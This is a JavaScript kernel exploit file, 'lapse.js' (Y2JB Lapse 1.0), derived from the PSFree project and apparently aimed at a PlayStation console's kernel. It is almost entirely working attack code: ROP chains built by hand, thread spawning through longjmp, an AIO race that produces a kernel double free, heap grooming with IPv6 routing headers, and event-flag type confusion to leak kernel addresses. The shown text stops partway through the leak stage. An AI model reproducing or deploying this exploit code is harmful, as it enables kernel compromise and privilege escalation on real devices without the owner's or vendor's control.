/*
    Copyright (C) 2025 Gezine
    Copyright (C) 2025 anonymous
    
    This file `lapse.js` contains a derivative work of `lapse.mjs`, which is a
    part of PSFree.

    Source:
    https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
    https://github.com/Al-Azif/psfree-lapse/tree/v1.5.0
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

(async function() {
    try {
        const lapse_version = "Y2JB Lapse 1.0 by Gezine";
        
        let failcheck_path;

        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 0x100;
        const NUM_WORKERS = 2;
        const NUM_GROOMS = 0x200;
        const NUM_HANDLES = 0x100;
        const NUM_SDS = 64;
        const NUM_SDS_ALT = 48;
        const NUM_RACES = 100;
        const NUM_ALIAS = 100;
        const LEAK_LEN = 16;
        const NUM_LEAKS = 16;
        const NUM_CLOBBERS = 8;
        const MAX_AIO_IDS = 0x80;

        SYSCALL.pipe = 0x2an;
        SYSCALL.unlink = 0xan;
        SYSCALL.socketpair = 0x87n;
        SYSCALL.thr_self = 0x1b0n;
        SYSCALL.thr_exit = 0x1afn;
        SYSCALL.sched_yield = 0x14bn;
        SYSCALL.thr_new = 0x1c7n;
        SYSCALL.cpuset_getaffinity = 0x1e7n;
        SYSCALL.cpuset_setaffinity = 0x1e8n;
        SYSCALL.rtprio_thread = 0x1d2n;
        SYSCALL.evf_create = 0x21an;
        SYSCALL.evf_delete = 0x21bn;
        SYSCALL.evf_set = 0x220n;
        SYSCALL.evf_clear = 0x221n;
        SYSCALL.thr_suspend_ucontext = 0x278n;
        SYSCALL.thr_resume_ucontext = 0x279n;
        SYSCALL.aio_multi_delete = 0x296n;
        SYSCALL.aio_multi_wait = 0x297n;
        SYSCALL.aio_multi_poll = 0x298n;
        SYSCALL.aio_multi_cancel = 0x29an;
        SYSCALL.aio_submit_cmd = 0x29dn;
        SYSCALL.getpid = 0x14n;

        const AF_UNIX = 1n;
        const AF_INET = 2n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const SOCK_DGRAM = 2n;
        const SOL_SOCKET = 0xffffn;
        const SO_REUSEADDR = 4n;
        const SO_LINGER = 0x80n;
        
        const IPPROTO_TCP = 6n;
        const IPPROTO_UDP = 17n;
        const IPPROTO_IPV6 = 41n;
        const INADDR_ANY = 0n;
        
        const TCP_INFO = 0x20n;
        const size_tcp_info = 0xecn
        
        const TCPS_ESTABLISHED = 4n;
        
        const IPV6_2292PKTOPTIONS = 25n;
        const IPV6_PKTINFO = 46n;
        const IPV6_NEXTHOP = 48n;
        const IPV6_RTHDR = 51n;
        const IPV6_TCLASS = 61n;
        
        const AIO_CMD_READ = 1n;
        const AIO_CMD_FLAG_MULTI = 0x1000n;
        const AIO_CMD_MULTI_READ = 0x1001n;
        const AIO_CMD_WRITE = 2n;
        const AIO_STATE_COMPLETE = 3n;
        const AIO_STATE_ABORTED = 4n;        
        
        const SCE_KERNEL_ERROR_ESRCH = 0x80020003n;
        
        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;

        let block_fd = 0xffffffffffffffffn;
        let unblock_fd = 0xffffffffffffffffn;
        let block_id = -1n;
        let groom_ids = null;
        let sds = null;
        let sds_alt = null;
        let prev_core = -1;
        let prev_rtprio = 0n;
        let ready_signal = 0n;
        let deletion_signal = 0n;
        let pipe_buf = 0n;
        let setjmp_addr = 0n;
        let longjmp_addr = 0n;
        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        function compare_version(a, b) {
            const [amaj, amin] = a.split('.').map(Number);
            const [bmaj, bmin] = b.split('.').map(Number);
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        function wait_for(addr, threshold) {
            while (read64(addr) !== threshold) {
                nanosleep(1);
            }
        }

        function pin_to_core(core) {
            const mask = malloc(0x10);
            write32(mask, BigInt(1 << core));
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, -1n, 0x10n, mask);
        }

        function get_core_index(mask_addr) {
            let num = Number(read32(mask_addr));
            let position = 0;
            while (num > 0) {
                num = num >>> 1;
                position++;
            }
            return position - 1;
        }

        function get_current_core() {
            const mask = malloc(0x10);
            syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, -1n, 0x10n, mask);
            return get_core_index(mask);
        }

        function set_rtprio(prio) {
            const rtprio = malloc(0x4);
            write16(rtprio, PRI_REALTIME);
            write16(rtprio + 2n, BigInt(prio));
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
        }

        function get_rtprio() {
            const rtprio = malloc(0x4);
            write16(rtprio, PRI_REALTIME);
            write16(rtprio + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
            return read16(rtprio + 0x2n);
        }

        function new_socket() {
            const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd === 0xffffffffffffffffn) {
                throw new Error("new_socket error: " + toHex(sd));
            }
            return sd
        }

        function new_tcp_socket() {
            const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
            if (sd === 0xffffffffffffffffn) {
                throw new Error("new_tcp_socket error: " + toHex(sd));
            }            
            return sd
        }

        function set_sockopt(sd, level, optname, optval, optlen) {
            const result = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, BigInt(optlen));
            if (result === 0xffffffffffffffffn) {
                throw new Error("set_sockopt error: " + toHex(result));
            }
            return result;
        }

        function get_sockopt(sd, level, optname, optval, optlen) {
            const len_ptr = malloc(4);
            write32(len_ptr, BigInt(optlen));
            const result = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, len_ptr);
            if (result === 0xffffffffffffffffn) {
                throw new Error("get_sockopt error: " + toHex(result));
            }
            return read32(len_ptr);
        }

        function set_rthdr(sd, buf, len) {
            return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
        }

        function get_rthdr(sd, buf, max_len) {
            return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
        }

        function free_rthdrs(sds) {
            for (let i = 0; i < sds.length; i++) {
                if (sds[i] !== 0xffffffffffffffffn) {
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0n, 0);
                }
            }
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8(buf, 0n);
            write8(buf + 1n, BigInt(len));
            write8(buf + 2n, 0n);
            write8(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }

        function aton(ip_str) {
            const parts = ip_str.split('.').map(Number);
            return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
        }

        function aio_submit_cmd(cmd, reqs, num_reqs, priority, ids) {
            const result = syscall(SYSCALL.aio_submit_cmd, cmd, reqs, BigInt(num_reqs), priority, ids);
            if (result === 0xffffffffffffffffn) {
                throw new Error("aio_submit_cmd error: " + toHex(result));
            }
            return result;
        }

        function aio_multi_delete(ids, num_ids, states) {
            const result = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
            if (result === 0xffffffffffffffffn) {
                throw new Error("aio_multi_delete error: " + toHex(result));
            }
            return result;
        }

        function aio_multi_poll(ids, num_ids, states) {
            const result = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
            if (result === 0xffffffffffffffffn) {
                throw new Error("aio_multi_poll error: " + toHex(result));
            }
            return result;
        }

        function aio_multi_cancel(ids, num_ids, states) {
            const result = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
            if (result === 0xffffffffffffffffn) {
                throw new Error("aio_multi_cancel error: " + toHex(result));
            }
            return result;
        }
        
        function aio_multi_wait(ids, num_ids, states, mode, timeout) {
            const result = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), timeout);
            if (result === 0xffffffffffffffffn) {
                throw new Error("aio_multi_wait error: " + toHex(result));
            }
            return result;
        }
        
        function make_reqs1(num_reqs) {
            const reqs = malloc(0x28 * num_reqs);
            for (let i = 0; i < num_reqs; i++) {
                write32(reqs + BigInt(i * 0x28 + 0x20), -1n);
            }
            return reqs;
        }
        
        function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
            loops = loops || 1;
            cmd = cmd || AIO_CMD_READ;
            if (multi === undefined) multi = true;

            const step = 4 * (multi ? num_reqs : 1);
            const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0n);

            for (let i = 0; i < loops; i++) {
                aio_submit_cmd(final_cmd, reqs, num_reqs, 3n, ids + BigInt(i * step));
            }
        }

        function cancel_aios(ids, num_ids) {
            const len = MAX_AIO_IDS;
            const rem = num_ids % len;
            const num_batches = Math.floor((num_ids - rem) / len);

            const errors = malloc(4 * len);

            for (let i = 0; i < num_batches; i++) {
                aio_multi_cancel(ids + BigInt(i * 4 * len), len, errors);
            }

            if (rem > 0) {
                aio_multi_cancel(ids + BigInt(num_batches * 4 * len), rem, errors);
            }
        }

        function free_aios(ids, num_ids, do_cancel) {
            if (do_cancel === undefined) do_cancel = true;

            const len = MAX_AIO_IDS;
            const rem = num_ids % len;
            const num_batches = Math.floor((num_ids - rem) / len);

            const errors = malloc(4 * len);

            for (let i = 0; i < num_batches; i++) {
                const addr = ids + BigInt(i * 4 * len);
                if (do_cancel) {
                    aio_multi_cancel(addr, len, errors);
                }
                aio_multi_poll(addr, len, errors);
                aio_multi_delete(addr, len, errors);
            }

            if (rem > 0) {
                const addr = ids + BigInt(num_batches * 4 * len);
                if (do_cancel) {
                    aio_multi_cancel(addr, rem, errors);
                }
                aio_multi_poll(addr, rem, errors);
                aio_multi_delete(addr, rem, errors);
            }
        }

        function free_aios2(ids, num_ids) {
            free_aios(ids, num_ids, false);
        }
        
        function call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid) {
            let rop_i = 0;
            
            // write(pipe_write_fd, pipe_buf, 1)
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = SYSCALL.write;
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = pipe_write_fd;
            rop_chain[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
            rop_chain[rop_i++] = pipe_buf;
            rop_chain[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
            rop_chain[rop_i++] = 1n;
            rop_chain[rop_i++] = syscall_wrapper;
            
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = SYSCALL.sched_yield;
            rop_chain[rop_i++] = syscall_wrapper;
            
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = SYSCALL.thr_suspend_ucontext;
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = thr_tid;
            rop_chain[rop_i++] = syscall_wrapper;
            
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = return_value_addr;
            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
            
            // Return safe tagged value to JavaScript
            rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret
            rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret
            rop_chain[rop_i++] = saved_fp;
            rop_chain[rop_i++] = ROP.mov_rsp_rbp; // mov rsp, rbp ; pop rbp ; ret
            
            return pwn(fake_frame);
        }

        function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n);
            call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid);
            
            return return_value_buf[0];
        }
        
        function init_threading() {
            setjmp_addr = libc_base + 0x58F80n;
            longjmp_addr = libc_base + 0x58FD0n;
            
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            
            saved_fpu_ctrl = Number(read32(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32(jmpbuf + 0x44n));
        }

        function spawn_thread(rop_chain_race1_array) {
            const rop_chain_race1_addr = get_backing_store(rop_chain_race1_array);
            
            const jmpbuf = malloc(0x60);
            
            write64(jmpbuf + 0x00n, ROP.ret);      // ret addr (RIP)
            write64(jmpbuf + 0x10n, rop_chain_race1_addr);             // RSP - pivot to rop_chain_race1
            write32(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));   // FPU control word
            write32(jmpbuf + 0x44n, BigInt(saved_mxcsr));      // MXCSR
            
            const stack_size = 0x400n;
            const tls_size = 0x40n;
            
            const thr_new_args = malloc(0x80);
            const tid_addr = malloc(0x8);
            const cpid = malloc(0x8);
            const stack = malloc(Number(stack_size));
            const tls = malloc(Number(tls_size));
            
            write64(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
            write64(thr_new_args + 0x08n, jmpbuf);             // arg = jmpbuf
            write64(thr_new_args + 0x10n, stack);              // stack_base
            write64(thr_new_args + 0x18n, stack_size);         // stack_size
            write64(thr_new_args + 0x20n, tls);                // tls_base
            write64(thr_new_args + 0x28n, tls_size);           // tls_size
            write64(thr_new_args + 0x30n, tid_addr);           // child_tid (output)
            write64(thr_new_args + 0x38n, cpid);               // parent_tid (output)
            
            const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            
            if (result !== 0n) {
                throw new Error("thr_new failed: " + toHex(result));
            }
            
            const tid = read64(tid_addr);
            return tid;
        }
        
        async function setup() {
            try {
                init_threading();

                ready_signal = malloc(8);
                deletion_signal = malloc(8);
                pipe_buf = malloc(8);
                write64(ready_signal, 0n);
                write64(deletion_signal, 0n);

                prev_core = get_current_core();
                prev_rtprio = get_rtprio();

                pin_to_core(MAIN_CORE);
                set_rtprio(MAIN_RTPRIO);

                await log("Pinned to core " + get_current_core() + " with prio " + MAIN_RTPRIO);

                const sockpair = malloc(8);
                if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair) !== 0n) {
                    return false;
                }

                block_fd = read32(sockpair);
                unblock_fd = read32(sockpair + 4n);
                await log("Created socketpair: block_fd=" + block_fd + " unblock_fd=" + unblock_fd);

                const block_reqs = malloc(0x28 * NUM_WORKERS);
                for (let i = 0; i < NUM_WORKERS; i++) {
                    const offset = i * 0x28;
                    write32(block_reqs + BigInt(offset + 0x08), 1n);
                    write32(block_reqs + BigInt(offset + 0x20), block_fd);
                }

                const block_id_buf = malloc(4);
                if (aio_submit_cmd(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3n, block_id_buf) !== 0n) {
                    return false;
                }

                block_id = read32(block_id_buf);
                await log("AIO workers blocked with ID: " + block_id);
                
                const num_reqs = 3;
                const groom_reqs = make_reqs1(num_reqs);
                const groom_ids_addr = malloc(4 * NUM_GROOMS);
                
                spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
                cancel_aios(groom_ids_addr, NUM_GROOMS);
                
                groom_ids = [];
                for (let i = 0; i < NUM_GROOMS; i++) {
                    groom_ids.push(Number(read32(groom_ids_addr + BigInt(i * 4))));
                }
                
                sds = [];
                for (let i = 0; i < NUM_SDS; i++) {
                    sds.push(new_socket());
                }
                
                sds_alt = [];
                for (let i = 0; i < NUM_SDS_ALT; i++) {
                    sds_alt.push(new_socket());
                }
                
                return true;

            } catch (e) {
                await log("Setup failed: " + e.message);
                return false;
            }
        }
        
        async function double_free_reqs2() {
            try {
                const server_addr = malloc(16);
                write8(server_addr + 1n, AF_INET);
                write16(server_addr + 2n, 0n);
                write32(server_addr + 4n, BigInt(aton("127.0.0.1")));

                const sd_listen = new_tcp_socket();

                const enable = malloc(4);
                write32(enable, 1n);
                set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);

                if (syscall(SYSCALL.bind, sd_listen, server_addr, 16n) !== 0n) {
                    await log("bind failed");
                    syscall(SYSCALL.close, sd_listen);
                    return null;
                }

                const addr_len = malloc(4);
                write32(addr_len, 16n);
                if (syscall(SYSCALL.getsockname, sd_listen, server_addr, addr_len) !== 0n) {
                    await log("getsockname failed");
                    syscall(SYSCALL.close, sd_listen);
                    return null;
                }
                await log("Bound to port: " + Number(read16(server_addr + 2n)));

                if (syscall(SYSCALL.listen, sd_listen, 1n) !== 0n) {
                    await log("listen failed");
                    syscall(SYSCALL.close, sd_listen);
                    return null;
                }
                
                const num_reqs = 3;
                const which_req = num_reqs - 1;
                const reqs = make_reqs1(num_reqs);
                const aio_ids = malloc(4 * num_reqs);
                const req_addr = aio_ids + BigInt(which_req * 4);
                const errors = malloc(4 * num_reqs);
                const cmd = AIO_CMD_MULTI_READ;

                for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
                    await log("Race attempt " + attempt + "/" + NUM_RACES);

                    const sd_client = new_tcp_socket();

                    if (syscall(SYSCALL.connect, sd_client, server_addr, 16n) !== 0n) {
                        syscall(SYSCALL.close, sd_client);
                        continue;
                    }

                    const sd_conn = syscall(SYSCALL.accept, sd_listen, 0n, 0n);

                    const linger_buf = malloc(8);
                    write32(linger_buf, 1n);
                    write32(linger_buf + 4n, 1n);
                    set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
                    
                    write32(reqs + BigInt(which_req * 0x28 + 0x20), sd_client);
                    
                    if (aio_submit_cmd(cmd, reqs, num_reqs, 3n, aio_ids) !== 0n) {
                        syscall(SYSCALL.close, sd_client);
                        syscall(SYSCALL.close, sd_conn);
                        continue;
                    }

                    aio_multi_cancel(aio_ids, num_reqs, errors);
                    aio_multi_poll(aio_ids, num_reqs, errors);
                    
                    syscall(SYSCALL.close, sd_client);

                    const sd_pair = await race_one(req_addr, sd_conn, sds);
                    
                    aio_multi_delete(aio_ids, num_reqs, errors);
                    syscall(SYSCALL.close, sd_conn);

                    if (sd_pair !== null) {
                        await log("Won race at attempt " + attempt);
                        syscall(SYSCALL.close, sd_listen);
                        return sd_pair;
                    }
                }

                syscall(SYSCALL.close, sd_listen);
                return null;

            } catch (e) {
                await log("Stage 1 error: " + e.message);
                return null;
            }
        }

        async function race_one(req_addr, tcp_sd, sds) {
            try {
                write64(ready_signal, 0n);
                write64(deletion_signal, 0n);

                const sce_errs = malloc(8);
                write32(sce_errs, -1n);
                write32(sce_errs + 4n, -1n);

                const [pipe_read_fd, pipe_write_fd] = create_pipe();
                
                const rop_chain_race1 = new BigUint64Array(200);
                
                // rop_chain_race1[0] will be overwritten by longjmp, so skip it
                let rop_i = 1;

                const cpu_mask = malloc(0x10);
                write16(cpu_mask, BigInt(1 << MAIN_CORE));
                
                // Pin to core
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.cpuset_setaffinity;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = 3n;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = -1n;
                rop_chain_race1[rop_i++] = ROP.pop_rcx; // pop rcx ; ret
                rop_chain_race1[rop_i++] = 0x10n;
                rop_chain_race1[rop_i++] = ROP.pop_r8; // pop r8 ; ret
                rop_chain_race1[rop_i++] = cpu_mask;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                const rtprio_buf = malloc(4);
                write16(rtprio_buf, PRI_REALTIME);
                write16(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));

                // Set priority
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.rtprio_thread;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = 0n;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = rtprio_buf;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                // Signal ready
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = ready_signal;
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
                
                // Read from pipe (blocks here)
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.read;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = pipe_read_fd;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = pipe_buf;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                // aio multi delete
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.aio_multi_delete;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = req_addr;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = sce_errs + 4n;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                // Signal deletion
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = deletion_signal;
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret

                // Thread exit
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.thr_exit;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = 0n;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                const thr_tid = spawn_thread(rop_chain_race1);
                
                wait_for(ready_signal, 1n);
                
                const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
                
                await log("Suspend result: " + toHex(suspend_res));

                const poll_err = malloc(4);
                aio_multi_poll(req_addr, 1, poll_err);
                const poll_res = read32(poll_err);
                await log("Poll after suspend: " + toHex(poll_res));

                const info_buf = malloc(0x100);
                const info_size = get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100);
                
                if (info_size !== size_tcp_info) {
                    await log("info size isn't " + size_tcp_info + ": " + info_size);
                }
                
                const tcp_state = read8(info_buf);
                await log("tcp_state: " + toHex(tcp_state));
                
                let won_race = false;

                if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
                    aio_multi_delete(req_addr, 1, sce_errs);
                    won_race = true;
                    await log("Race won!");
                } else {
                    await log("Race not won (poll_res=" + toHex(poll_res) + " tcp_state=" + toHex(tcp_state) + ")");
                }

                const resume_result = syscall(SYSCALL.thr_resume_ucontext, thr_tid);
                await log("Resume " + toHex(thr_tid) + ": " + resume_result);
                
                wait_for(deletion_signal, 1n);

                if (won_race) {
                    const err_main_thr = read32(sce_errs);
                    const err_worker_thr = read32(sce_errs + 4n);
                    await log("sce_errs: main=" + toHex(err_main_thr) + " worker=" + toHex(err_worker_thr));

                    if (err_main_thr === err_worker_thr && err_main_thr === 0n) {
                        await log("Double-free successful, making aliased rthdrs...");
                        const sd_pair = await make_aliased_rthdrs(sds);
                        
                        if (sd_pair !== null) {
                            syscall(SYSCALL.close, pipe_read_fd);
                            syscall(SYSCALL.close, pipe_write_fd);
                            return sd_pair;
                        } else {
                            await log("Failed to make aliased rthdrs");
                        }
                    } else {
                        await log("sce_errs mismatch - race failed");
                    }
                }

                syscall(SYSCALL.close, pipe_read_fd);
                syscall(SYSCALL.close, pipe_write_fd);
                return null;

            } catch (e) {
                await log("Race error: " + e.message);
                await log(e.stack);
                return null;
            }
        }

        async function make_aliased_rthdrs(sds) {
            const marker_offset = 4;
            const size = 0x80;
            const buf = malloc(size);
            const rsize = build_rthdr(buf, size);

            for (let loop = 1; loop <= NUM_ALIAS; loop++) {
                for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
                    const sd = Number(sds[i-1]);
                    if (sds[i-1] !== 0xffffffffffffffffn) {
                        write32(buf + BigInt(marker_offset), BigInt(i));
                        set_rthdr(sd, buf, rsize);
                    }
                }

                for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
                    const sd = Number(sds[i-1]);
                    if (sds[i-1] !== 0xffffffffffffffffn) {
                        get_rthdr(sd, buf, size);
                        const marker = Number(read32(buf + BigInt(marker_offset)));
                        
                        if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                            const aliased_idx = marker - 1;
                            const aliased_sd = Number(sds[aliased_idx]);
                            if (aliased_idx >= 0 && aliased_idx < sds.length && sds[aliased_idx] !== 0xffffffffffffffffn) {
                                await log("Aliased rthdrs at attempt: " + loop);

                                const sd_pair = [sd, aliased_sd];
                                const max_idx = Math.max(i-1, aliased_idx);
                                const min_idx = Math.min(i-1, aliased_idx);
                                sds.splice(max_idx, 1);
                                sds.splice(min_idx, 1);
                                free_rthdrs(sds);
                                sds.push(new_socket());
                                sds.push(new_socket());
                                return sd_pair;
                            }
                        }
                    }
                }
            }
            return null;
        }
        
        function new_evf(name, flags) {
            const result = syscall(SYSCALL.evf_create, name, 0n, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_create error: " + toHex(result));
            }
            return result;
        }

        function set_evf_flags(id, flags) {
            let result = syscall(SYSCALL.evf_clear, id, 0n);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_clear error: " + toHex(result));
            }
            result = syscall(SYSCALL.evf_set, id, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_set error: " + toHex(result));
            }
            return result;
        }

        function free_evf(id) {
            const result = syscall(SYSCALL.evf_delete, id);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_delete error: " + toHex(result));
            }
            return result;
        }

        function verify_reqs2(addr, cmd) {
            if (read32(addr) !== cmd) {
                return false;
            }

            const heap_prefixes = [];

            for (let i = 0x10n; i <= 0x20n; i += 8n) {
                if (read16(addr + i + 6n) !== 0xffffn) {
                    return false;
                }
                heap_prefixes.push(Number(read16(addr + i + 4n)));
            }

            const state1 = Number(read32(addr + 0x38n));
            const state2 = Number(read32(addr + 0x3cn));
            if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
                return false;
            }

            if (read64(addr + 0x40n) !== 0n) {
                return false;
            }

            for (let i = 0x48n; i <= 0x50n; i += 8n) {
                if (read16(addr + i + 6n) === 0xffffn) {
                    if (read16(addr + i + 4n) !== 0xffffn) {
                        heap_prefixes.push(Number(read16(addr + i + 4n)));
                    }
                } else if (i === 0x50n || read64(addr + i) !== 0n) {
                    return false;
                }
            }

            if (heap_prefixes.length < 2) {
                return false;
            }

            const first_prefix = heap_prefixes[0];
            for (let idx = 1; idx < heap_prefixes.length; idx++) {
                if (heap_prefixes[idx] !== first_prefix) {
                    return false;
                }
            }

            return true;
        }

        async function leak_kernel_addrs(sd_pair, sds) {
            
            const sd = sd_pair[0];
            const buflen = 0x80 * LEAK_LEN;
            const buf = malloc(buflen);

            await log("Confusing evf with rthdr...");

            const name = malloc(1);

            syscall(SYSCALL.close, BigInt(sd_pair[1]));

            let evf = null;
            for (let i = 1; i <= NUM_ALIAS; i++) {
                const evfs = [];

                for (let j = 1; j <= NUM_HANDLES; j++) {
                    const evf_flags = 0xf00n | (BigInt(j) << 16n);
                    evfs.push(new_evf(name, evf_flags));
                }

                get_rthdr(sd, buf, 0x80);

                const flag = Number(read32(buf));

                if ((flag & 0xf00) === 0xf00) {
                    const idx = (flag >>> 16) & 0xffff;
                    const expected_flag = BigInt(flag | 1);

                    evf = evfs[idx - 1];

                    set_evf_flags(evf, expected_flag);
                    get_rthdr(sd, buf, 0x80);

                    const val = read32(buf);
                    if (val === expected_flag) {
                        evfs.splice(idx - 1, 1);
                    } else {
                        evf = null;
                    }
                }

                for (let k = 0; k < evfs.length; k++) {
                    if (evf === null || evfs[k] !== evf) {
                        free_evf(evfs[k]);
                    }
                }

                if (evf !== null) {
                    await log("Confused rthdr and evf at attempt: " + i);
                    break;
                }
            }

            if (evf === null) {
                await log("Failed to confuse evf and rthdr");
                return null;
            }

            set_evf_flags(evf, 0xff00n);

            const kernel_addr = read64(buf + 0x28n);
            await log("\"evf cv\" string addr: " + toHex(kernel_addr));

            const kbuf_addr = read64(buf + 0x40n) - 0x38n;
            await log("Kernel buffer addr: " + toHex(kbuf_addr));

            const wbufsz = 0x80;
            const wbuf = malloc(wbufsz);
